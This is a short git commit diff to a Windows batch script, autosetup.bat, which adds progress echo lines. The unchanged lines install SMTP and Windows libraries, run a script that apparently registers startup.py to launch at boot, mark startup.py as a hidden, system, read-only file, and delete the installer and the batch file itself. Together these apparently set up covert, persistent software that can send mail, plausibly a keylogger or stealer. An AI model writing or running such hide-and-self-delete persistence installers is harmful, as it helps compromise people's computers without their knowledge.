3377cb6e519bc33394d1d29afce174fa79370a3f
Tanjim Abubokor <59773799+tanjim750@users.noreply.github.com>
2023-06-04 20:07:02 +0600

    Update autosetup.bat

--- autosetup.bat
+++ autosetup.bat
@@ -7,9 +7,14 @@ pip install pywin32
 pip install secure-smtplib
 pip install email
 
-
+echo running set_startup.py
 python set_startup.py
 
+echo set_startup.py has been successfully run
 attrib +s +h +r "startup.py"
+
+echo deleting all file
 del set_startup.py
 del autosetup.bat
+echo all done
+pause
